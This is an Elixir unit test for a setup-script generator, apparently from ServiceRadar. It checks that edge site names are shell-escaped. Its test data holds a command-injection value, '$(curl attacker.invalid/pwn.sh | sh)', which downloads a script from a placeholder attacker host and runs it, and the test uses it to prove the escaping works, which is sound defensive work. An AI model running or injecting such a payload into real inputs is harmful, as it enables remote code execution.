defmodule ServiceRadar.Edge.NatsLeafConfigGeneratorTest do
  use ExUnit.Case, async: true

  alias ServiceRadar.Edge.NatsLeafConfigGenerator

  test "setup script shell-escapes edge site names" do
    edge_site = %{
      name: "$(curl attacker.invalid/pwn.sh | sh) O'Hare",
      slug: "ohare-edge"
    }

    script = NatsLeafConfigGenerator.generate_setup_script(edge_site)

    assert script =~ "SITE_NAME='$(curl attacker.invalid/pwn.sh | sh) O'\"'\"'Hare'"
    assert script =~ "printf 'Setting up NATS leaf server for %s..."
    assert script =~ "\"$SITE_NAME\""

    refute script =~
             "echo \"Setting up NATS leaf server for $(curl attacker.invalid/pwn.sh | sh) O'Hare...\""
  end
end
